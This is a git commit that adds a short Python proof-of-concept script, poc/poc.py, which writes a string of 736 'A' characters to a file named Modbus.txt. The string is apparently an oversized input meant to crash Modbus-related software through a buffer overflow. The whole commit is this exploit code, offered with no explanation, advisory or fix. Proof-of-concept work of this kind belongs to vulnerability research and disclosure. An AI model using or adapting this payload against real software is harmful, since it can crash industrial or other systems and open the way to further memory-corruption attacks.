728a07d7cbfba74a89bda575b68f6dfee8645d79
壮士 <xiahao90@qq.com>
2023-01-09 16:28:38 +0800

    add

---
+++ poc/poc.py
@@ -0,0 +1,12 @@
+#!/usr/bin/python
+
+exploit = 'A' * 736
+
+try: 
+    file = open("Modbus.txt","w")
+    file.write(exploit)
+    file.close()
+
+    print("POC is created")
+except:
+    print("POC not created")
